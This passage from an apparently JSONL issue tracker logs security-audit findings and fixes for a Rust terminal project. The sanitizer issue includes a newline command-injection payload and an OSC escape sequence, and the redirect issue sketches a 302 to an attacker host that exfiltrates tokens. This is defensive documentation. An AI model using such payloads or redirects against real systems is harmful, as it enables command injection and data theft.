Filed per /security-audit-for-saas pass #4.","status":"closed","priority":1,"issue_type":"bug","created_at":"2026-04-21T04:28:12.543862Z","created_by":"jemanuel","updated_at":"2026-04-21T04:32:41.769958Z","closed_at":"2026-04-21T04:32:41.769575Z","close_reason":"Closed by 969b9e02. Added sanitize_restored_command() helper in restore_process.rs that rejects \r/\n/ESC/other C0 controls. Wired into both launch_agent_legacy (line 632) and launch_agent_cx (line 656) before format!({command}\r). 8 unit tests cover legitimate inputs (claude-code, codex resume, env-prefixed, UTF-8), the exact attack payload from the bead (claude-code\ninnocent_payload\r), bare CR/LF, OSC via ESC (\x1b]0;pwned\x07), BEL/NUL, and byte-offset fail-fast ordering. Does NOT route through wezterm cli spawn argv-isolated (documented as follow-up); this closure is the defense-in-depth gate at the sanitizer boundary.","source_repo":".","compaction_level":0,"original_size":0,"labels":["command-injection","defense-in-depth","restore","security"]}
 {"id":"ft-kfkyi","title":"DistributedHttpClient must not transparently follow 3xx redirects","description":"# Security: DistributedHttpClient transparent redirect following

## Background
Discovered during ft-xbnl0.2.4 tick 349 verification work. `DistributedHttpClient`
(built on the default asupersync HTTP client config) **follows 3xx redirects
transparently** by default. A 302 with an arbitrary `Location:` header is
followed without caller visibility.

Current behavior is pinned by `distributed_http_client_3xx_redirect_current_behavior_snapshot`
in `crates/frankenterm-core/src/distributed.rs` (tests module) — the test
asserts `Err` on a 302 whose Location is unresolvable, and explicitly
documents that assertion flipping is the trigger for this bead's work.

## Security concern
`DistributedHttpClient` is used for distributed node-to-node RPC (health
checks, event forwarding). Peer URLs are supposed to point at trusted
nodes. Transparent redirect following means:

- A compromised peer can respond `302 Location: http://attacker.com/` →
  next request body is sent to attacker (including event data, pane
  captures, auth tokens).
- Even without compromise, a misconfigured peer with a redirect loop
  could cause unbounded work.

## Fix
Configure `RedirectPolicy::none()` at the `DistributedHttpClient`
construction site — see `crates/frankenterm-core/src/distributed.rs`
around `DistributedHttpClient::new()` and `DistributedHttpClient::plaintext()`.

This forces the caller to explicitly handle (or ignore) the redirect.

## Verification
After the fix:
1. `distributed_http_client_3xx_redirect_current_behavior_snapshot` will
   fail — update it to assert `resp.status == 302` and rename to drop
   the "current-behavior-snapshot" suffix. Rename to
   `distributed_http_client_returns_3xx_redirect_as_ok_response`.
2. Add a second test asserting that a 302 → a different internal host
   is ALSO observable (not followed) — use a second TcpListener in
   the test so the "Location" resolves but the client still doesn't
   follow it.

## Out of scope
- Building a full redirect-following mechanism (if callers want redirects,
  they can opt in explicitly by following the Location themselves after
  inspecting it).
- The asupersync HTTP client's default RedirectPolicy — that's a library
  default and changing it would affect every other caller. The fix is
  to override at the FrankenTerm distributed-client construction site.

## References
- Finding tick: ft-xbnl0.2.4 tick 349 (commit 4013f6e9)
- Related doc: docs/ft-xbnl0-2-4-completion-evidence.md §5 (out of scope carve-out)","status":"closed","priority":2,"issue_type":"task","assignee":"jemanuel","created_at":"2026-04-18T16:59:46.872931Z","created_by":"jemanuel","updated_at":"2026-04-18T17:08:05.852811Z","closed_at":"2026-04-18T17:08:05.852502Z","close_reason":"Completed by tick 351 (commit 4717c434): DistributedHttpClient::new() now constructs via builder with .no_redirects() explicitly. 3xx responses are Ok(Response{status: 3xx}) observable to caller. Snapshot test renamed + flipped to assert Ok(302). All 40 ft-xbnl0.2.4 tests still pass via scripts/check_ft_xbnl0_2_4.sh.","source_repo":".","compaction_level":0,"original_size":0,"labels":["asupersync","distributed","http","security"],"dependencies":[{"issue_id":"ft-kfkyi","depends_on_id":"ft-xbnl0.2.4","type":"related","created_at":"2026-04-18T16:59:50.751738Z","created_by":"jemanuel","metadata":"{}","thread_id":""}]}

 {"id":"ft-l6v1r","title":"[mor:distributed-systems] missed PaneDestroyed leaks tier/state maps across the swarm","description":"# Observation

`PaneTierClassifier` holds `RwLock<HashMap<u64, PaneState>>`
(crates/frankenterm-core/src/pane_tiers.rs:238). Entries are added in
`register_pane` and removed in `unregister_pane`. The only thing
driving `unregister_pane` is a PaneDestroyed event flowing through the
native-events channel.

That channel has three failure modes documented in
`dispatch_event_with_timeout_with_cx`:
- `EventDispatchOutcome::Sent` — happy path
- `EventDispatchOutcome::Backpressure` — timeout expired, event dropped
- `EventDispatchOutcome::Closed` — channel gone

Backpressure drops are observable (ft-0e179 covers that), but a
dropped PaneDestroyed event is silently swallowed: the pane's entry
stays in the tier map forever. In a fleet with aggressive pane churn
(200+ panes, short-lived workflow agents), this is an unbounded leak
— map grows monotonically, classify() iterates more entries, the
RwLock hot path gets slower.

# Question

Should PaneTierClassifier have a reconciliation sweep that runs
periodically — say every 60s — and reconciles its HashMap against
`wezterm cli list`'s source-of-truth set of active pane IDs,
unregistering anything that wezterm no longer has? This converts a
silent-forever leak into an eventually-consistent cleanup, at the
cost of one extra `wezterm cli list` per sweep (already cached in
`PaneListCache`).

Same leak shape likely exists in other per-pane maps
(backpressure.paused_panes as Vec<u64>, aegis_backpressure state, any
per-pane metric stores). A crate-wide audit with one shared reconciler
is probably cheaper than 12 one-off fixes.

# CAP stance

Current design is "consistency by event delivery." On paper, the
event stream is authoritative. In practice, bounded queues mean
delivery is not guaranteed. A ground-truth reconciler trades the
"instantaneous" property for "eventually matches reality" — better
for a long-running daemon than the alternative.","status":"closed","priority":3,"issue_type":"question","created_at":"2026-04-21T17:34:51.772093Z","created_by":"mor-review","updated_at":"2026-04-21T20:35:30.788429Z","closed_at":"2026-04-21T20:35:30.788109Z","close_reason":"Verified in d13fe125","source_repo":".","compaction_level":0,"original_size":0,"labels":["distributed-systems","mor","pane-lifecycle"]}
 {"id":"ft-l9mxa","title":"DistributedHttpClient response-read path does not observe mid-flight cx-cancel","description":"# DistributedHttpClient mid-flight cx-cancel gap

## Background
Discovered during ft-xbnl0.2.4 tick 380 verification work. When a caller fires
`cx.cancel_with(...)` WHILE a `DistributedHttpClient::get` is in flight (blocked
reading response bytes from a stalled server), the cancel does NOT propagate to
the HTTP client's read loop.

## Reproduction
The ft-xbnl0.2.4 test
`distributed::tests::distributed_http_client_mid_flight_cancel_does_not_hang`
exercises this. Observed behavior:

    elapsed = 10.02s
    result = Err("deadline has elapsed at Time(10000000041ns)")

The elapsed = ~10s matches the test's DEFENSIVE outer timeout ceiling
(`crate::runtime_compat::timeout(10s, client.get(...))`), not the 50 ms
cx-cancel fire. The cancel went through (cx.is_cancel_requested() would return
true) but the HTTP client's await points didn't observe it.

## Relation to other findings
- **Tick 328** documented that `timeout_with_cx` observes cx *budget deadline*
  but not direct cx *cancel*. This is the same shape of gap at a different
  layer — the HTTP client wraps asupersync::http::h1 whose await points
  don't poll cx.
- **ft-kfkyi** (closed tick 351) was a distinct concern (3xx redirect
  exfil). This finding is lower-severity: not a security issue, just an
  operational-ergonomics gap.

## Impact
- Hung distributed RPC calls will eventually time out via internal limits
  (if any configured) but won't observe operator-initiated cancel.
- Agent workflows that fire cx.cancel to abort a slow peer call will wait
  the full internal-timeout window before the call returns.

## Fix approach (candidate paths)
1. Extend `DistributedHttpClient::get/post` to race the inner future against
   a cx-cancel future (tokio::select! or similar race).
2. Patch asupersync::http::h1 to thread cx through its await points and
   honor cancel at read/write boundaries. Bigger scope; upstream change.
3. Wrap the DistributedHttpClient inner calls in `timeout_with_cx` —
   but per tick 328, that only observes budget, not cancel. So this
   doesn't help unless the caller sets a short budget.

Option (1) is the narrowest change; aligns with the cx-first migration
pattern and doesn't require upstream asupersync work.

## Verification
The existing tick-380 snapshot test is the flip trigger. When the fix lands:
1. Observed elapsed drops from ~10s to << 10s (cx-cancel observed mid-read).
2. `result` shape changes from the outer-timeout Err to the HTTP client's
   own cancel-shaped Err.
3. Update the snapshot assertions to require the faster behavior.

## References
- Finding: ft-xbnl0.2.4 tick 380 (commit 4d925607)
- Related: `docs/ft-xbnl0-2-4-completion-evidence.md §5` out-of-scope carve-out
  for primitive-doc-only coverage (timeout_with_cx / sleep_with_cx — ticks
  328 / 331).","status":"closed","priority":3,"issue_type":"task","assignee":"jemanuel","created_at":"2026-04-18T20:12:43.612639Z","created_by":"jemanuel","updated_at":"2026-04-18T20:50:48.342908Z","closed_at":"2026-04-18T20:50:48.342659Z","close_reason":"Fixed by tick 387 (commit 99640e41): DistributedHttpClient::{get,post} now race inner call against cx-cancel watcher (50ms poll). Mid-flight cancel surfaces as Ok(Err(Cancelled)) in ~70ms. Tick-380 snapshot test tightened to assert the new fast-cancel behavior (elapsed < 1s, exact Cancelled variant).","source_repo":".","compaction_level":0,"original_size":0,"labels":["asupersync","cx-cancel","distributed","http"],"dependencies":[{"issue_id":"ft-l9mxa","depends_on_id":"ft-xbnl0.2.4","type":"related","created_at":"2026-04-18T20:12:58.856854Z","created_by":"jemanuel","metadata":"{}","thread_id":""}]}

 {"id":"ft-njlk0","title":"docs: add SECURITY.md with fix history","description":"The repo has no SECURITY.md (neither at root nor under `docs/`).
Downstream users and contributors currently have no canonical
place to find:

1. the project's security posture and trust boundaries,
2. how to report a suspected vulnerability privately,
3. the audit trail of shipped security fixes.

Pane 5's 2026-04-20 → 2026-04-21 security audit shipped 7 fixes
across 8 audit passes. Beads are the current record; SECURITY.md
would give operators and auditors a single readable entry point.

## Proposed SECURITY.md scope

### § Reporting vulnerabilities
- Preferred channel (placeholder: maintainer email / GitHub private
  advisory).
- What to include in a report (repro, affected version, workspace
  config shape).
- Expected response SLO (e.g. 7d acknowledgement, 30d fix
  timeline for MEDIUM+).
- Explicit out-of-scope: DoS on unsupported platforms, findings
  that require pre-existing DB write access (captured in ft-kegvt
  / ft-ybtyg close-reasons).

### § Trust boundaries
- MCP stdio transport inherits OS uid/gid; no in-band auth.
- `.ft/` directory contents are treated as attacker-reachable
  (hostile repo clone is a real threat model).
- `ft watch` runs as the invoking user; no privilege separation.
- Pane output captured into storage is redacted on READ surfaces,
  NOT at ingest; DB file permissions are the containment boundary.

### § Fix history (session 2026-04-20 / 2026-04-21)

| Severity | Commit | Summary |
|----------|--------|---------|
| CRITICAL | 30988e53 | MCP `contract_file` / `mission_file` containment — blocks arbitrary R/W under watcher UID via hostile path args; `compute_workspace_scoped_path` with `..` reject + canonicalize + `starts_with(root_canon)`. |
| HIGH | 070117a0 | Pattern-engine ReDoS cap — `compile_rule_regex` via `RegexBuilder::new(raw).backtrack_limit(10M)` at all compile sites; blocks hostile `.ft/patterns/*.yaml` DoS. |
| MEDIUM | 969b9e02 | Restored-command CR/LF/ESC/C0 sanitizer in `launch_agent_{legacy,cx}`; blocks shell injection via tampered `mux_pane_state.command`. |
| MEDIUM | 598a7c13 | Session-checkpoint state_hash: replaced hardcoded `'restore'` literal with domain-separated SipHash-24 over `(session_id, pane_id_map, now_ms)`; docs realigned from misleading "BLAKE3" to accurate "SipHash-24 — not cryptographic integrity". |
| LOW | e790f481 | Diag bundle privacy scrubber — `gather_environment` routes `cwd` through `scrub_path_to_basename`; `DiagnosticOptions.include_full_cwd: false` by default; blocks `/Users/<name>/project-name` leak in shared bundles. |
| LOW | 0f38972b | `frankenterm-mux-server` SIGTERM/SIGINT handler — async-signal-safe `AtomicBool` flag polled by executor loop; ensures `wezterm_blob_leases::clear_storage()` runs on graceful shutdown instead of SIGKILL-skip. |
| LOW/MEDIUM | e8397747 / 8e57c8e0 | Size caps — `MAX_PACK_BYTES = 16 MiB` pre-parse stat check in `load_pack_from_file`; `MAX_SEND_TEXT_BYTES = 4 MiB` pre-dispatch in `WaSendTool::call`; blocks hostile-pack OOM and runaway `wa.send` payload. |

### § Regression guards
0aa93816 added victory-lap tests:
- symlink-escape rejection for MCP containment (relative + absolute variants, #[cfg(unix)]),
- ReDoS-budget headroom proof on a 100 KiB realistic input.

### § Non-normative: audit session findings classified as
defense-in-depth documentation only
- ft-yv02l (mock-code-finder catalog, closed benign)
- ft-2guux (reality-check: README cwd claim, Unix-only `ft restart`)

## Acceptance criteria
1. `/SECURITY.md` exists at repo root (the conventional GitHub
   location so it surfaces in the Security tab).
2. Sections match the four headings above.
3. Every commit hash in the Fix history table links to the
   correct git object (spot-check with `git show <hash>`).
4. Reporting channel is operator-decided — this bead should ask
   the maintainer before committing a specific contact.

## Out of scope
- Signing / provenance infrastructure (separate lane).
- Formal threat model diagram (scope creep for a docs bead).
- Translating fix-history entries into CVE identifiers (no CVE
  pipeline currently).

## Priority rationale
P2: no active exploit, no shipped user-visible gap — but the
SECURITY.md absence is a contributor-onboarding obstacle and
a GitHub "Security Policy" badge gap that every serious repo
should close.

 {"id":"ft-olq2e","title":"[HIGH] integration_mux_checkpoint_topology never validates post-rollback topology","description":"Audit finding from commit 909c3d89.

File: crates/frankenterm-core/tests/integration_mux_checkpoint_topology.rs:385-389

The test claims to verify that rollback restores the original topology, but it reconstructs `restored_topo` from `initial_topo_json` captured before mutation, not from the server/registry state after rollback:

- line 308 serializes the initial topology into `initial_topo_json`
- lines 385-389 deserialize that same baseline JSON and compare it to `initial_topo`

That assertion is vacuous: it will pass even if `RemoteRequest::Rollback` leaves the server in the wrong pane/tree layout, as long as the old serialized baseline is still parseable. The test currently proves JSON roundtrip of the baseline snapshot, not rollback correctness.

Expected fix:
- derive the post-rollback topology from the actual restored server state (or its durable checkpoint payload), then compare pane ids/tree structure against the pre-expansion baseline
- keep the current rollback-history assertions as secondary checks, not the only evidence

Regression risk: high false confidence on mux rollback behavior in the persistence lane.","status":"closed","priority":1,"issue_type":"bug","created_at":"2026-04-20T05:49:43.010557Z","created_by":"jemanuel","updated_at":"2026-04-20T06:19:20.471789Z","closed_at":"2026-04-20T06:19:20.471571Z","close_reason":"Phase 5 now derives post-rollback pane id set from server.registry().snapshot() instead of re-deserializing the pre-mutation baseline JSON.
